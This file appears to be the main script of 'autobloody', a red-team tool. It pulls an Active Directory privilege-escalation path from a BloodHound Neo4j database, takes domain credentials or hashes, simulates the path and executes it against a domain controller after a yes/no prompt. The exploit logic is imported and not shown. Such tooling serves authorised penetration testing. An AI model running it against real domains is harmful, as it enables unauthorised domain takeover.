#!/usr/bin/env python3
import argparse, json, sys
from autobloody import automation, database, proxy_bypass

def main():
    parser = argparse.ArgumentParser(description='AD Privesc Automation', formatter_class=argparse.RawTextHelpFormatter)

    # DB parameters
    parser.add_argument("--dburi", default="bolt://localhost:7687", help="The host neo4j is running on (default is \"bolt://localhost:7687\")")
    parser.add_argument("-du", "--dbuser", default="neo4j", help="Neo4j username to use (default is \"neo4j\")")
    parser.add_argument("-dp", "--dbpassword", help="Neo4j password to use", required=True)
    parser.add_argument("-ds", "--dbsource", help="Case sensitive label of the source node (name property in bloodhound)", required=True)
    parser.add_argument("-dt", "--dbtarget", help="Case sensitive label of the target node (name property in bloodhound)", required=True)

    # Exploitation parameters
    parser.add_argument('-d', '--domain', help='Domain used for NTLM authentication')
    parser.add_argument('-u', '--username', help='Username used for NTLM authentication')
    parser.add_argument('-p', '--password', help='Cleartext password or LMHASH:NTHASH for NTLM authentication')
    parser.add_argument('-k', '--kerberos', action='store_true', default=False)
    parser.add_argument('-c', '--certificate', help='Certificate authentication, e.g: "path/to/key:path/to/cert"')
    parser.add_argument('-s', '--secure', help='Try to use LDAP over TLS aka LDAPS (default is LDAP)', action='store_true', default=False)
    parser.add_argument('--host', help='Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)', required=True)

    if len(sys.argv)==1:
            parser.print_help(sys.stderr)
            sys.exit(1)
            
    args = parser.parse_args()

    path_dict = pathgen(args)

    automate = automation.Automation(args, path_dict)
    automate.simulate()
    execute_path = input("\n\nApply this privesc?(y/n)")
    if execute_path == 'y':
        automate.exploit()
        print("\n[+] Done, attack path executed")
    else:
        print("\n[-] Attack path not executed")


def pathgen(args):
    bypass = proxy_bypass.ProxyBypass()
    db = database.Database(args.dburi, args.dbuser, args.dbpassword)

    path = db.getPrivescPath(args.dbsource, args.dbtarget)
    path_dict = []
    for rel in path:
        start_node = {'name':rel.start_node['name'], 'distinguishedname':rel.start_node['distinguishedname'], 'objectid':rel.start_node['objectid']}
        end_node = {'name':rel.end_node['name'], 'distinguishedname':rel.end_node['distinguishedname'], 'objectid': rel.end_node['objectid']}
        path_dict.append({'start_node':start_node, 'end_node':end_node, 'cost':rel['cost']})

    db.close()
    bypass.disable()

    print(f"[+] Done, {len(path_dict)} edges have been found between {args.dbsource} and {args.dbtarget}")
    return path_dict


if __name__ == '__main__':
    main()
